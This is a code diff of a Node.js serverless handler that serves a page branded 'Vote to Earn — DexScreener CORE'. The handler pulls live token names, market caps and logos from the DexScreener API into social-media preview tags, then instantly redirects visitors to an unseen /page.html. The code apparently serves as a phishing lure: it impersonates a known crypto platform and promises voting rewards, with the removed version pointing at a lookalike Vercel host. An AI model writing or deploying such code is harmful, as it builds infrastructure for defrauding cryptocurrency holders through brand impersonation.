@@ -1,23 +1,22 @@
-const https = require('https');
+var https = require('https');
 
-function httpsGet(url) {
-    return new Promise(function(resolve, reject) {
-        var req = https.get(url, function(response) {
-            if (response.statusCode >= 300 && response.statusCode < 400 && response.headers.location) {
-                return httpsGet(response.headers.location).then(resolve).catch(reject);
+function httpGet(url) {
+    return new Promise(function (resolve, reject) {
+        https.get(url, function (r) {
+            if (r.statusCode >= 300 && r.statusCode < 400 && r.headers.location) {
+                return httpGet(r.headers.location).then(resolve).catch(reject);
             }
-            var data = '';
-            response.on('data', function(chunk) { data += chunk; });
-            response.on('end', function() {
-                resolve({ status: response.statusCode, body: data });
-            });
+            var d = '';
+            r.on('data', function (c) { d += c; });
+            r.on('end', function () { resolve(d); });
+        }).on('error', reject).setTimeout(5000, function () {
+            this.destroy();
+            reject(new Error('timeout'));
         });
-        req.on('error', function(err) { reject(err); });
-        req.setTimeout(5000, function() { req.destroy(); reject(new Error('timeout')); });
     });
 }
 
-function esc(s) {
+function e(s) {
     return String(s || '')
         .replace(/&/g, '&amp;')
         .replace(/"/g, '&quot;')
@@ -25,160 +24,115 @@ function esc(s) {
         .replace(/>/g, '&gt;');
 }
 
-function formatMcap(n) {
-    if (!n || n === 0) return '$0';
-    if (n >= 1e9) return '$' + (n / 1e9).toFixed(1) + 'B';
-    if (n >= 1e6) return '$' + (n / 1e6).toFixed(1) + 'M';
-    if (n >= 1e3) return '$' + (n / 1e3).toFixed(1) + 'K';
-    return '$' + Math.round(n);
-}
+module.exports = async function (req, res) {
+    var ca = (req.query.ca || req.query.token || '').trim();
+    var host = req.headers.host || '';
+    var fullUrl = 'https://' + host + '/?ca=' + encodeURIComponent(ca);
+    var redirect = '/page.html' + (ca ? '?ca=' + encodeURIComponent(ca) : '');
 
-var CHAIN_REWARDS = {
-    solana: 'SOL', ethereum: 'ETH', bsc: 'BNB', polygon: 'MATIC',
-    arbitrum: 'ETH', avalanche: 'AVAX', base: 'ETH', optimism: 'ETH',
-    fantom: 'FTM', cronos: 'CRO', sui: 'SUI', ton: 'TON',
-    mantle: 'MNT', linea: 'ETH', blast: 'ETH', scroll: 'ETH',
-    zksync: 'ETH', sei: 'SEI', near: 'NEAR', aptos: 'APT'
-};
+    var title = 'Vote to Earn — DexScreener CORE';
+    var desc = 'Vote and earn rewards from the community voting pool';
+    var img = '';
 
-module.exports = async function handler(req, res) {
-    try {
-        var ca = req.query.ca || req.query.token || '';
-        var host = req.headers.host || 'dexscreener-vote-nine.vercel.app';
-        var fullUrl = 'https://' + host + '/?ca=' + encodeURIComponent(ca);
-        var pageRedirect = '/page.html' + (ca ? '?ca=' + encodeURIComponent(ca) : '');
+    if (ca.length > 10) {
+        try {
+            var body = await httpGet(
+                'https://api.dexscreener.com/latest/dex/tokens/' + encodeURIComponent(ca)
+            );
+            var data = JSON.parse(body);
 
-        var ogTitle = 'Vote to Earn — DexScreener CORE';
-        var ogDesc = '🗳 Vote and earn rewards from the community voting pool';
-        var ogImage = 'https://dexscreener.com/og.png';
+            if (data.pairs && data.pairs.length > 0) {
+                data.pairs.sort(function (a, b) {
+                    return ((b.liquidity && b.liquidity.usd) || 0) -
+                           ((a.liquidity && a.liquidity.usd) || 0);
+                });
 
-        // ── Fetch token data if CA provided ──
-        if (ca && ca.length > 10) {
-            try {
-                var apiUrl = 'https://api.dexscreener.com/latest/dex/tokens/' + encodeURIComponent(ca);
-                var result = await httpsGet(apiUrl);
+                var p = data.pairs[0];
+                var tk = p.baseToken || {};
+                var ch = p.chainId || 'unknown';
+                var mc = p.fdv || p.marketCap || 0;
 
-                if (result.status === 200) {
-                    var data = JSON.parse(result.body);
+                var rewards = {
+                    solana:'SOL', ethereum:'ETH', bsc:'BNB', base:'ETH',
+                    arbitrum:'ETH', polygon:'MATIC', avalanche:'AVAX',
+                    optimism:'ETH', fantom:'FTM', sui:'SUI', ton:'TON',
+                    cronos:'CRO', mantle:'MNT', sei:'SEI', near:'NEAR'
+                };
+                var cs = rewards[ch] || ch.toUpperCase();
+                var nm = tk.name || tk.symbol || 'Token';
+                var sy = tk.symbol || tk.name || '???';
 
-                    if (data.pairs && data.pairs.length > 0) {
-                        var pair = data.pairs.sort(function(a, b) {
-                            var aLiq = (a.liquidity && a.liquidity.usd) || 0;
-                            var bLiq = (b.liquidity && b.liquidity.usd) || 0;
-                            return bLiq - aLiq;
-                        })[0];
+                var ms;
+                if (mc >= 1e9) ms = '$' + (mc / 1e9).toFixed(1) + 'B';
+                else if (mc >= 1e6) ms = '$' + (mc / 1e6).toFixed(1) + 'M';
+                else if (mc >= 1e3) ms = '$' + (mc / 1e3).toFixed(1) + 'K';
+                else ms = '$' + Math.round(mc || 0);
 
-                        var token = pair.baseToken || {};
-                        var chain = pair.chainId || 'unknown';
-                        var mcap = pair.fdv || pair.marketCap || 0;
-                        var chainSym = CHAIN_REWARDS[chain] || chain.toUpperCase();
-                        var name = token.name || token.symbol || 'Token';
-                        var symbol = token.symbol || token.name || '???';
-                        var mcapStr = formatMcap(mcap);
+                title = nm + ' \u2014 Vote to Earn ' + cs;
+                desc = '\uD83D\uDDF3 Vote for ' + sy + ' \u00B7 ' + ms + ' mcap \u00B7 Earn ' + cs + ' rewards from the community voting pool';
 
-                        if (pair.info && pair.info.imageUrl) {
-                            ogImage = pair.info.imageUrl;
-                        } else {
-                            ogImage = 'https://dd.dexscreener.com/ds-data/tokens/' + chain + '/' + ca + '.png';
-                        }
-
-                        ogTitle = name + ' — Vote to Earn ' + chainSym;
-                        ogDesc = '🗳 Vote for ' + symbol + ' · ' + mcapStr + ' mcap · Earn ' + chainSym + ' rewards from the community voting pool';
-                    }
+                if (p.info && p.info.imageUrl) {
+                    img = p.info.imageUrl;
+                } else {
+                    img = 'https://dd.dexscreener.com/ds-data/tokens/' + ch + '/' + ca + '.png';
                 }
-            } catch (apiErr) {
-                console.error('API error:', apiErr.message);
             }
+        } catch (err) {
+            console.error('API error:', err.message);
         }
-
-        // ── Generate HTML with OG tags + instant redirect ──
-        var html = '<!DOCTYPE html>\n'
-            + '<html lang="en">\n'
-            + '<head>\n'
-            + '<meta charset="UTF-8">\n'
-            + '<meta name="viewport" content="width=device-width, initial-scale=1.0">\n'
-            + '<title>' + esc(ogTitle) + '</title>\n'
-            + '<meta name="description" content="' + esc(ogDesc) + '">\n'
-            + '\n'
-            + '<!-- Open Graph -->\n'
-            + '<meta property="og:type" content="website">\n'
-            + '<meta property="og:site_name" content="DexScreener CORE">\n'
-            + '<meta property="og:title" content="' + esc(ogTitle) + '">\n'
-            + '<meta property="og:description" content="' + esc(ogDesc) + '">\n'
-            + '<meta property="og:image" content="' + esc(ogImage) + '">\n'
-            + '<meta property="og:image:width" content="512">\n'
-            + '<meta property="og:image:height" content="512">\n'
-            + '<meta property="og:url" content="' + esc(fullUrl) + '">\n'
-            + '\n'
-            + '<!-- Twitter Card -->\n'
-            + '<meta name="twitter:card" content="summary_large_image">\n'
-            + '<meta name="twitter:title" content="' + esc(ogTitle) + '">\n'
-            + '<meta name="twitter:description" content="' + esc(ogDesc) + '">\n'
-            + '<meta name="twitter:image" content="' + esc(ogImage) + '">\n'
-            + '\n'
-            + '<link rel="icon" type="image/png" href="' + esc(ogImage) + '">\n'
-            + '\n'
-            + '<style>\n'
-            + '  * { margin: 0; padding: 0; box-sizing: border-box; }\n'
-            + '  body {\n'
-            + '    background: #020203;\n'
-            + '    display: flex;\n'
-            + '    align-items: center;\n'
-            + '    justify-content: center;\n'
-            + '    height: 100vh;\n'
-            + '    flex-direction: column;\n'
-            + '    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;\n'
-            + '  }\n'
-            + '  .spinner {\n'
-            + '    width: 50px; height: 50px;\n'
-            + '    border: 3px solid rgba(34,197,94,0.1);\n'
-            + '    border-top-color: #22c55e;\n'
-            + '    border-radius: 50%;\n'
-            + '    animation: spin 1s linear infinite;\n'
-            + '  }\n'
-            + '  @keyframes spin { to { transform: rotate(360deg); } }\n'
-            + '  .text {\n'
-            + '    margin-top: 20px;\n'
-            + '    color: #6b7280;\n'
-            + '    font-size: 14px;\n'
-            + '    font-weight: 600;\n'
-            + '    letter-spacing: 1px;\n'
-            + '  }\n'
-            + '</style>\n'
-            + '</head>\n'
-            + '<body>\n'
-            + '  <div class="spinner"></div>\n'
-            + '  <div class="text">LOADING...</div>\n'
-            + '  <script>\n'
-            + '    var target = ' + JSON.stringify(pageRedirect) + ';\n'
-            + '    var xhr = new XMLHttpRequest();\n'
-            + '    xhr.open("GET", target, true);\n'
-            + '    xhr.onload = function() {\n'
-            + '      if (xhr.status === 200) {\n'
-            + '        document.open();\n'
-            + '        document.write(xhr.responseText);\n'
-            + '        document.close();\n'
-            + '      } else {\n'
-            + '        window.location.replace(target);\n'
-            + '      }\n'
-            + '    };\n'
-            + '    xhr.onerror = function() {\n'
-            + '      window.location.replace(target);\n'
-            + '    };\n'
-            + '    xhr.send();\n'
-            + '  </' + 'script>\n'
-            + '</body>\n'
-            + '</html>';
-
-        res.setHeader('Content-Type', 'text/html; charset=utf-8');
-        res.setHeader('Cache-Control', 'public, s-maxage=120, max-age=60, stale-while-revalidate=300');
-        return res.status(200).send(html);
-
-    } catch (err) {
-        console.error('Handler error:', err.message);
-        var fallbackCA = (req.query && req.query.ca) || '';
-        var fallback = '/page.html' + (fallbackCA ? '?ca=' + encodeURIComponent(fallbackCA) : '');
-        res.setHeader('Location', fallback);
-        return res.status(302).send('Redirecting...');
     }
+
+    var html = '<!DOCTYPE html>\n'
+        + '<html lang="en">\n'
+        + '<head>\n'
+        + '<meta charset="UTF-8">\n'
+        + '<meta name="viewport" content="width=device-width, initial-scale=1.0">\n'
+        + '<title>' + e(title) + '</title>\n'
+        + '<meta name="description" content="' + e(desc) + '">\n'
+        + '\n'
+        + '<meta property="og:type" content="website">\n'
+        + '<meta property="og:site_name" content="DexScreener CORE">\n'
+        + '<meta property="og:title" content="' + e(title) + '">\n'
+        + '<meta property="og:description" content="' + e(desc) + '">\n'
+        + '<meta property="og:url" content="' + e(fullUrl) + '">\n';
+
+    if (img) {
+        html += '<meta property="og:image" content="' + e(img) + '">\n'
+            + '<meta property="og:image:width" content="512">\n'
+            + '<meta property="og:image:height" content="512">\n';
+    }
+
+    html += '\n'
+        + '<meta name="twitter:card" content="summary">\n'
+        + '<meta name="twitter:title" content="' + e(title) + '">\n'
+        + '<meta name="twitter:description" content="' + e(desc) + '">\n';
+
+    if (img) {
+        html += '<meta name="twitter:image" content="' + e(img) + '">\n';
+    }
+
+    html += '\n'
+        + '<style>\n'
+        + 'body{margin:0;background:#020203;display:flex;align-items:center;'
+        + 'justify-content:center;height:100vh;flex-direction:column;'
+        + 'font-family:sans-serif}\n'
+        + '.s{width:50px;height:50px;border:3px solid rgba(34,197,94,.1);'
+        + 'border-top-color:#22c55e;border-radius:50%;'
+        + 'animation:r 1s linear infinite}\n'
+        + '@keyframes r{to{transform:rotate(360deg)}}\n'
+        + '.t{margin-top:16px;color:#555;font-size:13px;font-weight:600;'
+        + 'letter-spacing:1px}\n'
+        + '</style>\n'
+        + '</head>\n'
+        + '<body>\n'
+        + '<div class="s"></div>\n'
+        + '<div class="t">LOADING</div>\n'
+        + '<script>window.location.replace("' + redirect + '");</'+ 'script>\n'
+        + '<noscript><meta http-equiv="refresh" content="0;url=' + redirect + '"></noscript>\n'
+        + '</body>\n'
+        + '</html>';
+
+    res.setHeader('Content-Type', 'text/html; charset=utf-8');
+    res.setHeader('Cache-Control', 'public, s-maxage=300, max-age=60');
+    return res.status(200).send(html);
 };
